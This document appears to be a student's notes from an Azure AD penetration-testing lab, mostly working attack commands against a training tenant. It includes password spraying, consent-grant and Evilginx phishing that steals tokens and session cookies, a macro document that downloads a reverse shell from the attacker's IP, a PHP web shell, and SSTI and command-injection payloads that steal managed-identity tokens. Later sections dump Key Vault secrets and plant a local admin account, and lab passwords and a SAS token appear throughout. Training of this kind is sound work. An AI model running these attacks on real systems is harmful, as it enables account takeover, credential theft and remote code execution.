# Azure Pentest

## Basis
```
xfreerdp /u:studentuser13 /p:2MU3eDZn8FHEdbwm /v:172.16.150.13 /dynamic-resolution
sudo  mount -t cifs -o user=studentuser13 //172.16.150.13/shared /mnt/smb
```
## Enumeration 
```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName admin@defcorphq.onmicrosoft.com

# Get tenant ID
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com

```
- Validate email IDs
File of emails; /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
```
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
```

- Enumerate services used by subdomain enumeration with MicroBurst
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1

Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

- Password Spray 
```
. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd -Verbose
```

- Enumaration using Mg module
```
$email = "test@defcorphq.onmicrosoft.com"
$passwd = "V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd"
$passwd = ConvertTo-SecureString $passwd -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($email,$passwd)

Connect-AzAccount -Credential $creds
$graphtoken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force)

# Enumerate all users
Get-MgUser -All
Get-MgUser -All | select UserPrincipalName

# Enumerate a specific user 
Get-MgUser -UserId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *

# Enumerate group
Get-MgGroup -All

# Enumerrate devices
Get-MgDevice

# Get all the Global Administrators
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
$admin = (Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
$admin.displayName, $admin.mail

# List all custom directory roles
Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName

# List enterprise applications
Get-MgServicePrincipal -All -Filter "ServicePrincipalType eq 'Application'" | Select-Object DisplayName, AppId, Id

```

- Enumeration using Az PowerShel
```
$email = "test@defcorphq.onmicrosoft.com"
$passwd = "V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd"
$passwd = ConvertTo-SecureString $passwd -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ($email,$passwd)

Connect-AzAccount -Credential $creds

#Enumerate resources accessible
Get-AzResource
Get-AzResource | Select-Object Name, ResourceType, Location

# Get all the role assignments for the test user
$user = "test@defcorphq.onmicrosoft.com"
Get-AzRoleAssignment -SignInName $user

$assignments = Get-AzRoleAssignment -SignInName $user

# Process and format the output
$assignments | ForEach-Object {
    # Extract the last two parts of the Scope
    $scopeParts = $_.Scope -split '/'
    $shortScope = ($scopeParts[-2] + '/' + $scopeParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        Scope              = $shortScope
        DisplayName        = $_.DisplayName
        RoleDefinitionName = $_.RoleDefinitionName
        ObjectType         = $_.ObjectType
        CanDelegate        = $_.CanDelegate
    }
} | Format-Table -AutoSize


# list all the VMs where the current user has at least the Reader role
Get-AzVM | Select-Object Name, ResourceGroupName, Location

# list web apps 
$webapps = Get-AzWebApp

# Process and format the output
$webapps | ForEach-Object {
    # Extract the last two parts of the Scope
    $IDParts = $_.Id -split '/'
    $shortID = ($IDParts[-2] + '/' + $IDParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        ID              = $shortID
        Name        = $_.Name
        Kind = $_.Kind
        State = $_.State
        Location = $_.Location
        Hostnames         = $_.Hostnames
        Type         = $_.Type
    }
} | Format-Table -AutoSize


# List all App Services
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

# list Function Apps
Get-AzFunctionApp

# list storage account

$storageaccount = Get-AzStorageAccount

# Process and format the output
$storageaccount | ForEach-Object {
    # Extract the last two parts of the Scope
    #$IDParts = $_.Id -split '/'
    #$shortID = ($IDParts[-2] + '/' + $IDParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        #ID              = $shortID
        StorageAccountName        = $_.StorageAccountName
        ResourceGroupName = $_.ResourceGroupName
        Kind = $_.Kind
        Location = $_.Location
        AllowBlobPublicAccess         = $_.AllowBlobPublicAccess
        AllowSharedKeyAccess         = $_.AllowSharedKeyAccess
    }
} | Format-Table -AutoSize


# list the readable keyvaults for the current user

$keyvault = Get-AzKeyVault

# Process and format the output
$keyvault | ForEach-Object {
    # Extract the last two parts of the Scope
    $IDParts = $_.ResourceId -split '/'
    $shortID = ($IDParts[-2] + '/' + $IDParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        ID          = $shortID
        Name        = $_.VaultName
        ResourceGroupName = $_.ResourceGroupName
        Location = $_.Location
        Tags        = $_.Tags
    }
} | Format-Table -AutoSize


```

- Enumeration using az cli 
```
az login -u test@defcorphq.onmicrosoft.com -p V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd

az vm list
az vm list --query "[].[name]" -o table
az vm list --query "[].[name, licenseType, osProfile.[adminUsername], osProfile.[adminUsername], osProfile.[windowsConfiguration].[winRM], resourceGroup, ]" -o table

# app service
az webapp list
az webapp list --query "[].[name]" -o table

# function app
az functionapp list --query "[].[name]" -o table

az storage account list

az keyvault list
```

- Enumeration using ROADTools
```
cd C:\AzAD\Tools\ROADTools
.\venv\Scripts\activate
roadrecon auth -u test@defcorphq.onmicrosoft.com -p V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd
roadrecon gather

roadrecon plugin policies # due to the "internal-1.61" AAD Graph API version
roadrecon gui
```

- Enumeration using StormSpotter
```
# Start the backend service for StormSpotter
cd C:\AzAD\Tools\stormspotter\backend\
pipenv shell
python ssbackend.pyz

# Start the frontend webserver in a new PowerShell session
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\
quasar.cmd serve -p 9091 --history

# Prepare to run the Stormcollector ini another process
cd C:\AzAD\Tools\stormspotter\stormcollector\
pipenv shell
az login -u test@defcorphq.onmicrosoft.com -p V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd
python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli

```

- Enumeration using BloodHound 
```
$email = "test@defcorphq.onmicrosoft.com"
$passwd = "V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd"
$passwd = ConvertTo-SecureString $passwd -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ($email,$passwd)

Connect-AzAccount -Credential $creds
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds

. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose

# Resolve objectID to names
MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname

# List all the users with Global Administror role
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p

# find all paths to an Azure key vault
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p

# Analysis using BloodHound Community Edition
# https://azurehound-altsecdashboard.msappproxy.net/
# Username: cartpreader@altsecdashboard.onmicrosoft.com
# Password: ARe@dOnlyUsertol00kAtAzureHoundDashboard!
```

## Compromising an application administrator and their workstation using the Illicit Consent Grant attack
#for this example, defcorpextcontractors is the attacker tenant and defcorphq is the victim tenant
- Register MFA for the attacker user and connect with that user in the attacker tenant
- Register an application
1. go to Entra ID -> App Registrations and click on New registration
2. choose 'Accounts in any organizational directory (Any Entra ID directory - Multitenant)' 
3. use the URL of your student VM in the Redirect URI - https://172.16.150.13/login/authorized ; the IP address is for the attacker machine
4. Go to the 'Certificates & Secrets' blade of the application you registered, create a new client secret and copy it before browsing away from the page
5. go to the 'API permissions' blade and add the 'user.read' and 'User.ReadBasic.All' for the Microsoft Graph
6. Go to the OverView blade and note Application (Client) ID
7. Setup 365-Stealer (http://localhost:82/365-stealer/yourVictims) admin:Pass@123
8. Configure CLIENTID, REDIRECTURL and CLIENTSECRET so that it matches the application registered (can also be set with cli `python 365-Stealer.py --set-config`)
9. Run 365-Stealer and choose https
10. Run the tool; `python 365-Stealer.py --run-app`
11. Get the phishing link by browsing to the [https://localhost] using an **incognito window** and copying the lick under 'Read More'.
12. Send the phishing link (Emails can be gather with Invoke-EnumerateAzureSubDomains.ps1)

13. Get access tokens of the victims [http://localhost:82/365-Stealer/yourvictims/]

- Using the stole token
```
$Token = 'eyJ0eX..'
$Token = (gc .\Downloads\marc_access_token.txt)
$URI = 'https://graph.microsoft.com/v1.0/users'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

- Get reverse shell
```
#Create doc file 
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM
Set-MpPreference -DisableRealtimeMonitoring $true

iex (New-Object Net.Webclient).downloadstring("http://172.16.150.13:82/Out-Word.ps1")
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('172.16.150.13:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.13 -Port 4444" -OutputFile studentx.doc
exit

Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc

C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444

# upload the file on the drive using 365-Stealer
python 365-Stealer.py --refresh-user markdwalden@defcorphq.onmicrosoft.com --upload C:\AzAD\Tools\studentx.doc
```

-Local enumeration
```
whoami
az ad signed-in-user show

```

- Abuse the file upload vulnerability and compromise the app service.
```
//studentxshell.phtml
<?php

system($_REQUEST['cmd']);

?>

//studentxtoken.phtml
<?php

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

[https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env]
Get **IDENTITY_HEADER** and **IDENTITY_ENDPOINT**
[https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml]

```
$access_token  = 'eyJ0...'
$client_id = '064aaf57-30af-41f0-840a-0e21ed149946'
Connect-AzAccount -AccessToken $access_token  -AccountId $client_id

$assignments = Get-AzRoleAssignment 

# Process and format the output
$assignments | ForEach-Object {
    # Extract the last two parts of the Scope
    $scopeParts = $_.Scope -split '/'
    $shortScope = ($scopeParts[-2] + '/' + $scopeParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        Scope              = $shortScope
        DisplayName        = $_.DisplayName
        RoleDefinitionName = $_.RoleDefinitionName
        ObjectType         = $_.ObjectType
        CanDelegate        = $_.CanDelegate
    }
} | Format-Table -AutoSize



# Identifying subscription ID


$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $access_token"
    }
}
$subscriptionID = ((Invoke-RestMethod @RequestParams).value).ID

# List all resources accessible for the managed identity assigned to the app service.


$URI = ("https://management.azure.com"+$subscriptionID+"/resources?api-version=2020-10-01")
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $access_token"
    }
}
$all_res = (Invoke-RestMethod @RequestParams).value 

# Check allowed actions

$all_res | ForEach-Object {
    # Construct the URI for the Azure REST API request
    $URI = "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

    # Define the request parameters
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $access_token"
        }
    }

    # Output the resource ID
    Write-Output "Resource ID: $($_.id)"

    try {
        # Invoke the REST API and fetch the response
        $response = Invoke-RestMethod @RequestParams -ErrorAction Stop

        # Process the response to check for 'actions' and 'notActions'
        if ($response.value -and $response.value.Count -gt 0) {
            $response.value | ForEach-Object {
                if ($_.actions -and $_.actions.Count -gt 0) {
                    Write-Output "=== Actions ==="
                    $response.value.actions
                }

                
            }
        } else {
            Write-Output "No permissions data found."
        }
    } catch {
        Write-Warning "Failed to retrieve permissions for resource ID $($_.id). Error: $_"
    }

    Write-Output ""
}


```
- SSTI exploit [https://vaultfrontend.azurewebsites.net]
```
{{config.items()}}
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
#Get IDENTITY_HEADER and IDENTITY_ENDPOINT
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

- Find all accessible resources
```
$token = 'eyJ0e..'
Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
Get-AzResource
```

- OS cmd injection [https://virusscanner.azurewebsites.net/)]

content of python file 
```
import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()

print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\r\n[+] Graph API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

```
```
; ls /tmp;
; ls /tmp/uploads;

#upload python script
; python /tmp/uploads/studentx/studentx.py;
```

```
$token = 'eyJ0eX..'
$graphaccesstoken = 'eyJ0eX..'
$client_id = '62e44426-5c46-4e3c-8a89-f461d5d586f2'
Connect-AzAccount -AccessToken $token -MicrosoftGraphAccessToken $graphaccesstoken -AccountId $client_id 
Get-AzResource

#list all Enterprise Applications
$GraphAPIAccessToken = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $GraphAPIAccessToken"
    }
}
(Invoke-RestMethod @RequestParams).value | select displayName,id,publisherDomain

# List roles assigned to the enterprise applications 

(Invoke-RestMethod @RequestParams).value | foreach{
$MYURI = ("https://graph.microsoft.com/v1.0/servicePrincipals/"+$_.appId+"/appRoleAssignments")
$RequestPar = @{
    Method = 'GET'
    Uri = $MYURI
    Headers = @{
    'Authorization' = "Bearer $GraphAPIAccessToken"
    }
}
    try {
       (Invoke-RestMethod @RequestPar -ErrorAction SilentlyContinue).value 
    } catch {
        Write-Warning "Failed to retrieve permissions for resource ID $($_.appId). Error: $_"
    }

}

```

- Check app where secret can be added by using `Add-AzADAppSecret.ps1`
```
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $GraphAPIAccessToken -ErrorAction SilentlyContinue

#output 
Client secret added to :
Object ID : 35589758-714e-43a9-be9e-94d22fdd34f6
App ID    : f072c4a6-b440-40de-983f-a7f3bd317d8f
App Name  : fileapp
Key ID    : 7679416e-6d36-43ad-9265-2f4956adc8b3
...    : ...
```

- Find out insecure storage blobs in the defcorphq tenant
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
Invoke-EnumerateAzureBlobs -Base defcorp

#Open storage explorer and connect to SAS
https://defcorpcodebackup.blob.core.windows.net/client?sp=rl&st=2024-09-26T09:48:55Z&se=2025-12-31T18:48:55Z&spr=https&sv=2022-11-02&sr=c&sig=cdfpDLkAqQaw4BznlARLvOAkHhkMkx9fpYmChFKOzfQ%3D
```

- Enumeration on a reverse shell
```
# check if there is a user logged-in to az cli on the machine
az ad signed-in-user show

# add automation extension to az cli and list automation accounts
az extension add --upgrade -n automation
az automation account list

# check objects owned by signed in user
az ad signed-in-user list-owned-objects
az ad signed-in-user list-owned-objects --query "[].{DisplayName: displayName, ObjectID: id, Description: description}" --output table


# request a token for the Grpah API and interact with Grpah API
az account get-access-token --resource-type ms-graph

$graphtoken = $(az account get-access-token --resource-type ms-graph --query "accessToken").replace('"','')
$graphtoken = "..."
Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force)

# add Mark as a member of "Automation Admins" group
$user_email = "markdwalden@defcorphq.onmicrosoft.com"
$user_id = (Get-MgUser -UserId $user_email ).id

$group_name = 'Automation Admins' 
$group_id = (Get-MgGroup -Filter "DisplayName eq '$group_name'").Id

$params = @{"@odata.id" = ("https://graph.microsoft.com/v1.0/directoryObjects/"+$user_id)}
New-MgGroupMemberByRef -GroupId $group_id -BodyParameter $params

# Enumerate automation accounts and workergroup
az automation account list

Get-AzAutomationAccount| select AutomationAccountName,ResourceGroupName,Location | foreach{$_; echo ""; echo "===checking Automation Hybrid Worker Group==="; Get-AzAutomationHybridWorkerGroup -AutomationAccountName $_.AutomationAccountName -ResourceGroupName $_.ResourceGroupName | fl}

# request an access token for ARM
az account get-access-token

# request an access token for add-graph
az account get-access-token --resource-type aad-graph

# using both the tokens with Az PowerShell
$AADToken = 'eyJ0…'
$AccessToken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3

# get the role for Mark on the automation account
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation

# Contributor role can create and execute Runbooks on automation account
# check if a hybrid worker group is in use by the automation account (already in 'Enumerate automation accounts and workergroup' script)
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering

Import-AzAutomationRunbook -Name student13 -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose

# Publish the runbook so that it be can used
Publish-AzAutomationRunbook -RunbookName student13 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose

# start the runbook
Start-AzAutomationRunbook -RunbookName student13 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

- Getting command execution on an Azure VM
```
$access_token  = 'eyJ0...'
$client_id = '064aaf57-30af-41f0-840a-0e21ed149946'
Connect-AzAccount -AccessToken $access_token  -AccountId $client_id

$vmname = 'bkpadconnect'
$vm = Get-AzVM | Where-Object { $_.Name -eq $vmname }
$networkprofile = (Get-AzVM -Name $vm.Name -ResourceGroupName $vm.ResourceGroupName).NetworkProfile.NetworkInterfaces.Id.Split('/')[-1]
$networkipname = (Get-AzNetworkInterface -Name $networkprofile).IpConfigurations.PublicIpAddress.Id.Split('/')[-1]
$publicipaddress = (Get-AzPublicIpAddress -Name $networkipname).IpAddress

# run a command on the bkpadconnect Azure VM
Invoke-AzVMRunCommand -VMName $vm.Name -ResourceGroupName $vm.ResourceGroupName -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose

# content of adduser.ps1
$passwd = ConvertTo-SecureString "Stud13Password@123" -AsPlainText -Force
New-LocalUser -Name student13 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student13


# access the vm 
$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student13', $Password)
$sess = New-PSSession -ComputerName $publicipaddress -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess

# extract creds 
gc C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- request a keyvault access token
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}

```
- Request a new ARM access token
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

- Connect using Az PowerShell and use both the arm token and keyvault token
```
$accesstoken = 'eyJ0..'
$keyvaulttoken = 'eyJ0..'
$clientid = '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'
Connect-AzAccount -AccessToken $accesstoken -AccountId $clientid -KeyVaultAccessToken $keyvaulttoken

# Get all Key Vaults in the subscription
$keyVaults = Get-AzKeyVault

# Iterate over each Key Vault and get its secrets
foreach ($vault in $keyVaults) {
    Write-Host "Key Vault: $($vault.VaultName)"
    Write-Host "===================================="
    
    # Get secrets for the current Key Vault
    $secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName
    foreach ($secret in $secrets) {
        # Retrieve the secret value as plain text
        $plainTextSecret = (Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name –AsPlainText)

        Write-Host "Secret Name: $($secret.Name)"
        Write-Host "Secret Version: $($secret.Version)"
        Write-Host "Secret Value: $plainTextSecret"
        Write-Host "-----------------------------"
    }
    Write-Host "`n"
}

```
- Enumeration as Kathy 
```
$password = ConvertTo-SecureString 'Hav3Y0uLooked@KeyVault!!Azur3' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds

Get-AzResource | Select-Object Name, ResourceType, Location
$assignments = Get-AzRoleAssignment 

# Process and format the output
$assignments | ForEach-Object {
    # Extract the last two parts of the Scope
    $scopeParts = $_.Scope -split '/'
    $shortScope = ($scopeParts[-2] + '/' + $scopeParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        Scope              = $shortScope
        DisplayName        = $_.DisplayName
        RoleDefinitionName = $_.RoleDefinitionName
        ObjectType         = $_.ObjectType
        CanDelegate        = $_.CanDelegate
    }
} | Format-Table -AutoSize

```
- check the definition of this role
```
$rolename = "Virtual Machine Command Executor"
Get-AzRoleDefinition -Name $rolename
```

- Get some information about group and membership
```
$groupName = 'VM Admins'
Get-AzADGroup -DisplayName $groupName | fl

# Get the members of the group
$userDetailsList = @()

# Get the members of the group
$groupMembers = Get-AzADGroupMember -GroupDisplayName $groupName

# Iterate over each member to get detailed user information
foreach ($member in $groupMembers) {
    # Fetch detailed user info based on the object ID
    $userDetails = Get-AzADUser -ObjectId $member.Id

    # Add details to the array as a custom object
    $userDetailsList += [pscustomobject]@{
        DisplayName        = $userDetails.DisplayName
        Email              = $userDetails.Mail
        UserPrincipalName  = $userDetails.UserPrincipalName
        ObjectId           = $userDetails.Id
    }
}

# Output the results in a table format
$userDetailsList | Format-Table -AutoSize
```

- Get info about user using Mg
```
$useremail = 'VMContributor13@defcorphq.onmicrosoft.com'
$graphtoken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URI = ("https://graph.microsoft.com/v1.0/users/"+$useremail+"/memberOf")
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
        'Authorization' = "Bearer $graphtoken"
    }
}

# Fetch the results
$results = (Invoke-RestMethod @RequestParams).value

# Process and format the results into a table
$results | ForEach-Object {
    [pscustomobject]@{
        ODataType   = $_.'@odata.type'.replace("#microsoft.graph.","")
        DisplayName = $_.displayName
        Description = $_.description
        ID          = $_.id
    }
} | Format-Table -AutoSize
```
- Get information and membership of administrative unit
```
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)

$adminUnitId = 'e1e26d93-163e-42a2-a46e-1b7d52626395'
Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId $adminUnitId

Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $adminUnitId | fl *

# check for roles scoped to administrative unit
$adminUnitId = "e1e26d93-163e-42a2-a46e-1b7d52626395"

# Get the scoped role members for the specified Administrative Unit
$scopedRoleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $adminUnitId

# Initialize an array to store combined details
$combinedDetails = @()

# Process each scoped role member
foreach ($member in $scopedRoleMembers) {
    # Get detailed role information using RoleId
    $roleDetails = Get-MgDirectoryRole -DirectoryRoleId $member.RoleId

    # Get the user's email based on their ID
    $userDetails = Get-MgUser -UserId $member.RoleMemberInfo.Id

    # Add combined information to the array
    $combinedDetails += [pscustomobject]@{
        RoleMemberName  = $member.RoleMemberInfo.DisplayName
        Email           = $userDetails.Mail
        RoleMemberId    = $member.RoleMemberInfo.Id
        RoleName        = $roleDetails.DisplayName
        RoleDescription = $roleDetails.Description
        RoleId          = $roleDetails.Id
    }
}

# Display the combined details in a table
$combinedDetails | Format-List

```
- Phish user with Evilginx3

1. C:\AzAD\Tools\evilginx-v3.3.0\evilginx.exe -p C:\AzAD\Tools\evilginx-v3.3.0\phishlets -developer
2. Configure server domain and IP to match user ID and student VM IP `config domain student13.corp` and `config ipv4 external 172.16.150.13`
3. Select the phishlest template for office 365 and point it to a URL on the DNS created above (`phishlets hostname o365 student13.corp` and verify dns entries `phishlets get-hosts o365`). `phishlets` can be used to see all the templates
4. Setup DNS (here Technitium DNS server at [http://172.16.2.50:5380/] with admin:admin@123)
5. Add student13.corp as primary (default) zone
6. Edit the NS record to point it to the DNS server IP – 172.16.2.50 (DNS IP), TTL 3600 - by modifying the 'Name Server' value
7. Do the same for SOA record, TTL 14400, Retry 3600
8. Add a new A record in student13.corp with name **login** and IP address corresponding to the attacking machine, TTL – 180
9. Add a similar A record in studentx.corp with name **www** and IP address corresponding to the attacking machine, TTL – 180
10. Enable the phishlets `phishlets enable o365`
11. Create the lures `lures create o365` and get the lures `lures get-url 0`
12. Send the lure to the target victim email 
13. `sessions` and `sessions id` help to list sessions and cookies can be imported to bypass MFA 

Use the cookies and load them with Cookie-Editor extention, connect to [https://portal.azure.com]

- Reset vmcontributorx password
1. Go to Entra ID -> Manage -> Users
2. Select the user and click reset password
or 
copy the microsoft graph access token by searching "batch" in the memory of browser (F12), and look for https://graph.microsoft.com/beta/$batch
```
$userEmail = "VMContributor13@defcorphq.onmicrosoft.com"
$graphtoken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6....'

Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
$params = @{
passwordProfile = @{
forceChangePasswordNextSignIn = $false
password = "VM@Contributor@123@321"}
}

Update-MgUser -UserId $userEmail -BodyParameter $params -verbose
```
- Use vmcontributorx after registering for MFA
```
$tenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
Disconnect-MgGraph
Connect-AzAccount -TenantId $tenantId
```

- check the service principal that an AppID belongs to:
```
$clientId = "62e44426-5c46-4e3c-8a89-f461d5d586f2"
Get-MgServicePrincipal -All | ?{$_.AppId -eq $clientId} | fl
```

- Authenticate as a service principal
```
$appId = 'f072c4a6-b440-40de-983f-a7f3bd317d8f'
$password = ConvertTo-SecureString '......' -AsPlainText -Force
$tenantId = '2d50cb29-5f7b-48a4-87ce-fe75a941adb6'
$creds = New-Object System.Management.Automation.PSCredential($appId, $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant $tenantId
```

- Enumerate deployment template 
```
# Define the directory to save deployment templates
$savePath = "C:\windows\Temp\deployments"
if (-not (Test-Path -Path $savePath)) {
    New-Item -ItemType Directory -Path $savePath | Out-Null
}

# Get all resource groups
$resourceGroups = Get-AzResourceGroup

# Iterate over resource groups to find deployments
foreach ($resourceGroup in $resourceGroups) {
    Write-Host "Resource Group: $($resourceGroup.ResourceGroupName)"
    
    # Get all deployments in the resource group
    $deployments = Get-AzResourceGroupDeployment -ResourceGroupName $resourceGroup.ResourceGroupName

    foreach ($deployment in $deployments) {
        Write-Host "Deployment Name: $($deployment.DeploymentName)"
        Write-Host "Provisioning State: $($deployment.ProvisioningState)"
        Write-Host "Template URI: $($deployment.Properties.TemplateLink.Uri)"
        $deployment

        # Save the deployment template locally
        $templateFilePath = Join-Path -Path $savePath -ChildPath "$($deployment.DeploymentName).json"
        try {
            Save-AzResourceGroupDeploymentTemplate -ResourceGroupName $resourceGroup.ResourceGroupName -DeploymentName $deployment.DeploymentName -Path $templateFilePath -Force -ErrorAction Stop
            Write-Host "Template saved at: $templateFilePath"

            # Load the saved template and check for CommandToExecute
            $templateContent = Get-Content -Path $templateFilePath | ConvertFrom-Json
            $resources = $templateContent | Select-Object -ExpandProperty Resources
            foreach ($resource in $resources) {
                if ($resource.resources.properties.Settings -and $resource.resources.Properties.Settings.CommandToExecute) {
                    Write-Host "CommandToExecute found in resource: $($resource.Name)"
                    Write-Host "Command: $($resource.resources.Properties.Settings.CommandToExecute)"
                    Write-Host "------------------------------------"
                }
            }
        } catch {
            Write-Host "Error saving or processing template for deployment: $($deployment.DeploymentName)"
            Write-Host "Error: $_"
            Write-Host "------------------------------------"
        }
    }
}

Write-Host ""
Write-Host "------------------------------------"
Write-Host "Check Template with GUI"
Write-Host "------------------------------------"
```

- Enumerate StorageContainer
```
# Get all storage accounts in the subscription
$storageAccounts = Get-AzStorageAccount

